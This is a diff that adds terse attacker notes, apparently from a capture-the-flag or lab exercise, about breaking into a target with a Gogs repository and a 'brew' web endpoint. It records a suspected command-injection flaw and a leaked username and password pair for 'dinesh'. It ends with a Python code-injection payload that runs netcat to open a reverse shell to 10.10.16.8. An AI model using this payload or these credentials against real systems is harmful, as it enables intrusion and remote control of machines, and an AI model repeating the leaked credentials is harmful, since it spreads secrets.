@@ -1,0 +1,8 @@
+there is an issues on the gogs repo which is resolved with a later commit but in a way that lets you probably command inject
+
+dinesh leaked creds inside older commits
+dinesh:4aUh0A8PbVJxgd
+
+
+to the brew endpoint
+ "abv": "__import__('os').system('nc 10.10.16.8 9999 -e /bin/bash')"
